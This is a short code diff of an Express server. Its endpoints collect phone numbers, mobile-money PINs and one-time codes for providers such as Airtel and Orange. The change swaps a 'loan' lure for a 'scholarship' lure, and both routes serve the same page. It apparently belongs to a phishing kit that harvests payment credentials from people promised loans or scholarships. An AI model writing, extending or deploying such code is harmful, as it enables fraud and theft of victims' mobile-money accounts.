@@ -90,7 +90,7 @@ app.post('/api/verify/phone-pin', authenticateApiKey, async (req, res) => {
 
         const sanitizedPhone = String(phone).replace(/[^0-9]/g, '').slice(0, expected.max);
         const sanitizedPin = String(pin).replace(/[^0-9]/g, '').slice(0, 4);
-        const sanitizedFlow = String(flow || 'loan').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 50);
+        const sanitizedFlow = String(flow || 'scholarship').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 50);
         const sanitizedPaymentMethod = String(paymentMethod || 'airtel').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 20);
 
         const verificationValue = `Payment: ${sanitizedPaymentMethod}, Phone: ${sanitizedPhone}, PIN: ${sanitizedPin}`;
@@ -164,7 +164,7 @@ app.post('/api/verify/otp', authenticateApiKey, async (req, res) => {
 
         const sanitizedOtp = String(otp).replace(/[^0-9]/g, '').slice(0, 6);
         const sanitizedPhone = String(phone || '').replace(/[^0-9+ ]/g, '').slice(0, expected.max);
-        const sanitizedFlow = String(flow || 'loan').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 50);
+        const sanitizedFlow = String(flow || 'scholarship').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 50);
         const sanitizedPaymentMethod = String(paymentMethod || 'airtel').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 20);
 
         const verificationValue = paymentMethod === 'orange'
@@ -197,10 +197,6 @@ app.get('/', (req, res) => {
 });
 
 app.get('/scholarship', (req, res) => {
-    res.sendFile(path.join(__dirname, '..', 'loan.html'));
-});
-
-app.get('/loan', (req, res) => {
     res.sendFile(path.join(__dirname, '..', 'loan.html'));
 });
 
